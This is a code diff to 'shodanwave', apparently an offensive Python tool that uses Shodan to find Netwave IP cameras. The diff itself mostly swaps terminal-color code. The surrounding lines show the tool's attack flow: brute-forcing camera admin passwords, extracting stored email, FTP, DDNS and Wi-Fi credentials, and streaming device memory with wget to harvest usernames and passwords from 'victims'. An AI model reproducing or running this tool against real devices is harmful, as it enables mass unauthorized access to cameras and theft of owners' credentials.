@@ -7,40 +7,32 @@ import os
 import time
 import subprocess
 import signal
-from threading import Thread
-import random
+from colored import attr, fg, stylize
+
+figlet_header = """
+     _               _
+    | |             | |
+ ___| |__   ___   __| | __ _ _ ____      ____ ___   _____
+/ __| '_ \ / _ \ / _` |/ _` | '_ \ \ /\ / / _` \ \ / / _ \\
+\__ \ | | | (_) | (_| | (_| | | | \ V  V / (_| |\ V /  __/
+|___/_| |_|\___/ \__,_|\__,_|_| |_|\_/\_/ \__,_| \_/ \___|
+"""
 
 try:
     import shodan
     import requests
-    from pyfiglet import Figlet
     import tailer
 except ImportError as e:
     print("Error: %s \n" % (e))
     print("Try this ... pip install -r /path/to/requirements.txt")
 
 
-class backgroundColor:
-    HEADER = '\033[95m'
-    OKBLUE = '\033[94m'
-    OKGREEN = '\033[92m'
-    WARNING = '\033[93m'
-    FAIL = '\033[91m'
-    ENDC = '\033[0m'
-    BOLD = '\033[1m'
-    UNDERLINE = '\033[4m'
-
-
 def main():
-    Graph = Figlet(font='slant')
-    GraphRender = Graph.renderText('shodanwave')
-
-    print("%s" %
-          (backgroundColor.WARNING + GraphRender + backgroundColor.ENDC))
-    print(
-        backgroundColor.FAIL +
-        "\rThis tool is successfully connected to shodan service\nInformation the use of this tool is illegal, not bad.\n"
-        + backgroundColor.ENDC)
+    print("{}".format(stylize(figlet_header, fg("yellow"))))
+    print(stylize("This tool is successfully connected to shodan service.",
+                  fg("red")))
+    print(stylize("Information the use of this tool is illegal, not bad.",
+                  fg("red")))
 
     parser = argparse.ArgumentParser()
     parser.add_argument(
@@ -137,30 +129,26 @@ def main():
                 args.search, limit=args.limit, offset=args.offset)
             total = api.get('total')
 
-            print(backgroundColor.OKGREEN +
-                  "[+] Shodan successfully Connected." + backgroundColor.ENDC)
-            print(backgroundColor.OKGREEN + "[+] Netwave Exploit Enabled." +
-                  backgroundColor.ENDC)
-            print(backgroundColor.OKGREEN + "[+] Netwave IP Camera Found: %d" %
-                  (total) + backgroundColor.ENDC)
+            print(stylize("[+] Shodan successfully Connected.", fg("green")))
+            print(stylize("[+] Netwave Exploit Enabled.", fg("green")))
+            print(stylize("[+] Netwave IP Camera Found: {}".format(total),
+                          fg("green")))
 
             if args.username or args.password:
                 usernames = args.username.readlines()
                 passwords = args.password.readlines()
 
-                print(backgroundColor.OKGREEN + "[+] Passwords loaded: %d" %
-                      (len(passwords)) + backgroundColor.ENDC)
+                print(stylize("[+] Passwords loaded: {}".format(
+                    len(passwords)), fg("green")))
                 pass
 
-            ShodanModuleExploit = raw_input(
-                backgroundColor.WARNING +
-                "[!] Disable password discovery module? (Yes/no): " +
-                backgroundColor.ENDC)
+            ShodanModuleExploit = input(
+                stylize("[!] Disable password discovery module? (Yes/no): ",
+                        fg("yellow")))
 
             if ShodanModuleExploit.upper(
             ) == "YES" or ShodanModuleExploit.upper() == "Y":
-                print(backgroundColor.FAIL + "[-] Netwave exploit disabled." +
-                      backgroundColor.ENDC)
+                print(stylize("[-] Netwave exploit disabled.", fg("red")))
                 exploit = False
 
             while True:
@@ -207,14 +195,13 @@ def main():
                                     exploit = False
                                     found = True
 
-                                    print(backgroundColor.OKGREEN +
-                                          backgroundColor.BOLD +
-                                          "[+] Password Found %s@%s" %
-                                          (administrator, password) +
-                                          backgroundColor.ENDC)
-                                    print(backgroundColor.WARNING +
-                                          "[!] Trying to get more information"
-                                          + backgroundColor.ENDC)
+                                    print(stylize(
+                                        "[+] Password Found {}@{}".format(
+                                            administrator, password),
+                                        fg("green"), attr("bold")))
+                                    print(stylize(
+                                        "[!] Trying to get more information",
+                                        fg("yellow")))
 
                                     try:
 
@@ -297,34 +284,31 @@ def main():
                                                         "'")
                                                     msn_pwd = content[1]
                                             if not (email_user == ''):
-                                                print(backgroundColor.OKGREEN +
-                                                      "[+] Email: %s:%s" %
-                                                      (email_user, email_pwd) +
-                                                      backgroundColor.ENDC)
+                                                print(stylize(
+                                                    "[+] Email: {}:{}".format(
+                                                        email_user, email_pwd),
+                                                    fg("green")))
                                             if not (ftp_user == ''):
-                                                print(
-                                                    backgroundColor.OKGREEN +
-                                                    "[+] FTP: ftp://%s:%s@%s:%s"
-                                                    % (ftp_user, ftp_pwd,
-                                                       ftp_svr, ftp_port) +
-                                                    backgroundColor.ENDC)
+                                                print(stylize(
+                                                    "[+] FTP: ftp://{}:{}@{}:{}".
+                                                    format(
+                                                        ftp_user, ftp_pwd,
+                                                        ftp_svr, ftp_port)))
                                             if not (ddns_user == ''):
-                                                print(
-                                                    backgroundColor.OKGREEN +
-                                                    "[+] DNS: http://%s:%s@%s:%s"
-                                                    %
-                                                    (ddns_user, ddns_pwd,
-                                                     ddns_host, ddns_proxy_svr)
-                                                    + backgroundColor.ENDC)
+                                                print(stylize(
+                                                    "[+] DNS: http://{}:{}@{}:{}".
+                                                    format(
+                                                        ddns_user, ddns_pwd,
+                                                        ddns_host,
+                                                        ddns_proxy_svr)))
                                             if not (msn_user == ''):
-                                                print(backgroundColor.OKGREEN +
-                                                      "[+] MSN: %s@%s" %
-                                                      (msn_user, msn_pwd) +
-                                                      backgroundColor.ENDC)
+                                                print(stylize(
+                                                    "[+] MSN: {}@{}".format(
+                                                        msn_user, msn_pwd)))
                                     except Exception as e:
-                                        print(backgroundColor.FAIL +
-                                              "[-] %s not found " % url +
-                                              backgroundColor.ENDC)
+                                        print(stylize(
+                                            "[-] {} not found ".format(url),
+                                            fg("red")))
                                     break
                                 else:
                                     found = False
@@ -341,20 +325,16 @@ def main():
                                 exploit = False
                             else:
                                 exploit = True
-                                print(
-                                    backgroundColor.FAIL + backgroundColor.BOLD
-                                    + "[!] Password not found" +
-                                    backgroundColor.ENDC)
+                                print(stylize("[!] Password not found",
+                                              fg("red"), attr("bold")))
                     except Exception as e:
-                        print(backgroundColor.FAIL + "[-] %s not found" % url +
-                              backgroundColor.ENDC)
+                        print(stylize("[-] {} not found".format(url),
+                                      fg("red")))
 
-                    print(backgroundColor.WARNING +
-                          "[!] Getting System Information" +
-                          backgroundColor.ENDC)
-                    print(backgroundColor.WARNING +
-                          "[!] Getting Wireless System Information" +
-                          backgroundColor.ENDC)
+                    print(stylize("[!] Getting System Information",
+                                  fg("yellow")))
+                    print(stylize("[!] Getting Wireless System Information",
+                                  fg("yellow")))
 
                     try:
 
@@ -375,18 +355,16 @@ def main():
                                     macaddress = macaddress.split("'")
                                     macaddr = macaddress[1]
 
-                                    print(backgroundColor.WARNING +
-                                          "[+] Mac address found %s" %
-                                          (macaddr) + backgroundColor.ENDC)
+                                    print(stylize(
+                                        "[+] Mac address found {}".format(
+                                            macaddr), fg("yellow")))
 
                         else:
-                            print(backgroundColor.FAIL +
-                                  "[-] Getting mac address" +
-                                  backgroundColor.ENDC)
+                            print(stylize("[-] Getting mac address",
+                                          fg("red")))
                     except Exception as e:
-                        print(backgroundColor.FAIL +
-                              "[-] %s not found" % wireless +
-                              backgroundColor.ENDC)
+                        print(stylize("[-] {} not found".format(wireless),
+                                      fg("red")))
 
                     print(
                         """[+] Host: http://%s:%s\n[+] Country: %s\n[+] City: %s\n[+] Organization: %s\n[+] Product: %s"""
@@ -416,18 +394,14 @@ def main():
                                             "SSID") != -1:
                                     crendential = crendential.replace(
                                         "=", ": ")
-                                    print(backgroundColor.OKGREEN +
-                                          backgroundColor.BOLD +
-                                          "[+] %s" % crendential +
-                                          backgroundColor.ENDC)
+                                    print(stylize("[+] {}".format(crendential),
+                                                  fg("green"), attr("bold")))
                         else:
-                            print(backgroundColor.FAIL + backgroundColor.BOLD +
-                                  "[!] Wireless lan is disabled.." +
-                                  backgroundColor.ENDC)
+                            print(stylize("[!] Wireless lan is disabled..",
+                                          fg("red"), attr("bold")))
                     except Exception as e:
-                        print(backgroundColor.FAIL +
-                              "[!] Error: Wireless lan is disabled.." +
-                              backgroundColor.ENDC)
+                        print(stylize("[!] Error: Wireless lan is disabled..",
+                                      fg("red")))
 
                     try:
 
@@ -437,10 +411,9 @@ def main():
 
                         if exploit:
 
-                            print(
-                                backgroundColor.FAIL +
-                                "[+] Starting to read memory dump.. this could take a few minutes"
-                                + backgroundColor.ENDC)
+                            print(stylize(
+                                "[+] Starting to read memory dump.. this could take a few minutes",
+                                fg("red")))
                             proc = subprocess.Popen(
                                 "wget -qO- " + url + " >> tmpstream.txt",
                                 shell=True,
@@ -451,20 +424,21 @@ def main():
                                 "tail -f tmpstream.txt | strings >>tmpstrings.out",
                                 shell=True,
                                 preexec_fn=os.setsid)
-                            print(backgroundColor.BOLD + "[+] CTRL+C to exit.."
-                                  + backgroundColor.ENDC)
+                            print(stylize("[+] CTRL+C to exit..",
+                                          attr("bold")))
 
                             while 1:
                                 sys.stdout.flush()
                                 if os.stat('tmpstrings.out').st_size <= 1024:
                                     sys.stdout.write(
-                                        backgroundColor.OKGREEN +
-                                        "binary data: " + str(
+                                        stylize("binary data: " + str(
                                             os.stat('tmpstream.txt').st_size) +
-                                        "\r" + backgroundColor.ENDC)
+                                                "\r", fg("green")))
                                 else:
                                     sys.stdout.flush()
-                                    print("[+] Strings in binary data found.. password should be around line 10000")
+                                    print(
+                                        "[+] Strings in binary data found.. password should be around line 10000"
+                                    )
                                     for line in tailer.follow(
                                             open('tmpstrings.out', 'r')):
                                         if done == 0:
@@ -472,39 +446,43 @@ def main():
                                             if line == macaddr:
                                                 sys.stdout.flush()
                                                 done = 1
-                                                print(
-                                                    backgroundColor.OKGREEN +
-                                                    "[+] Mac address triggered.. printing the following dumps, could leak username and passwords.."
-                                                    + backgroundColor.ENDC)
+                                                print(stylize(
+                                                    "[+] Mac address triggered.. printing the following dumps, could leak username and passwords..",
+                                                    fg("green")))
                                             else:
                                                 sys.stdout.write(
                                                     str(linecount) + "\r")
                                         elif done == 1:
                                             done = 2
-                                            print("[+] Firstline.. " + backgroundColor.OKGREEN + line + backgroundColor.ENDC)
+                                            print(stylize(
+                                                "[+] Firstline.. {}".format(
+                                                    line), fg("green")))
                                         elif done == 2:
                                             done = 3
-                                            print("[+] Possible username: " + backgroundColor.OKGREEN + line + backgroundColor.ENDC)
+                                            print(stylize(
+                                                "[+] Possible username: {}".
+                                                format(line), fg("gree")))
                                         elif done == 3:
                                             done = 4
-                                            print("[+] Possible password: " + backgroundColor.OKGREEN + line + backgroundColor.ENDC)
+                                            print(stylize(
+                                                "[+] Possible password: {}".
+                                                format(line), fg("green")))
                                         elif done == 4:
                                             done = 0
-                                            print("[+] Following line.. \n\n" + backgroundColor.OKGREEN + line + backgroundColor.ENDC)
+                                            print(stylize(
+                                                "[+] Following line..\n\n{}".
+                                                format(line), fg("green")))
                                         else:
                                             pass
                             signal.pause()
                     except:
-                        print(
-                            backgroundColor.FAIL +
-                            "[-] Victim isnt vulnerable for a memory leak, exiting.."
-                            + backgroundColor.ENDC)
-                print(backgroundColor.OKGREEN + "[+] Done!" +
-                      backgroundColor.ENDC)
+                        print(stylize(
+                            "[-] Victim isnt vulnerable for a memory leak, exiting..",
+                            fg("red")))
+                print(stylize("[+] Done!", fg("green")))
                 return True
         except shodan.APIError as e:
-            print(backgroundColor.FAIL + "[-] Error: %s" %
-                  (e) + backgroundColor.ENDC)
+            print(stylize("[-] Error: {}".format(e), fg("red")))
             sys.exit(0)
 
     NetworkSearchosts()
